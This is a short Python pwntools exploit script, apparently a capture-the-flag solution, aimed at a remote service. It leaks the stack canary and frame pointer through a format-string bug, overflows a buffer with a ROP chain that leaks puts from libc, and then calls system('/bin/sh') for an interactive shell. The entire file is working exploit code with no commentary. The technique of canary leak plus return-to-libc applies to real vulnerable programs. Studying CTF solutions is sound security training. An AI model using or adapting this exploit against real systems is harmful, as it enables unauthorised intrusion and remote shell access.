from pwn import *

soal = ELF('./soal')
#p = process('./soal')
p = remote('asgama.web.id', 40200)
p.sendline('%83$p.%84$p.%85$p.%86$p.%87$p.%88$p.%89$p.%90$p')
print p.recvuntil('Hai ')
main_address = p32(0x08048648)
resp = p.recvline().strip()[:-1]
print resp
canary = resp[:10]
ebp = resp[11:21]
canary = p32(int(canary, 16))
ebp = p32(int(ebp, 16))

pailot = 'A'*310 + canary + ebp + 'AAAA' + 'AAAA' + 'AAAA' + 'AAAA' + 'AAAA' + 'AAAA' + p32(soal.plt['puts']) + main_address + p32(soal.got['puts'])
p.sendline(pailot)
print p.recvuntil('!\n')

offset_system = 0x03a940
offset_str_bin_sh = 0x15902b
offset_puts = 0x05f140

puts_address = int(u32(p.recvn(4)))
print hex(puts_address)
libc_base = puts_address - offset_puts
system_address = libc_base + offset_system
print hex(system_address)
sh_address = libc_base + offset_str_bin_sh



pailot = 'A'*310 + canary + ebp + 'aaaa' + 'aaaa' + p32(system_address) + main_address + p32(sh_address)
p.sendline('a')
p.sendline(pailot)

p.interactive()
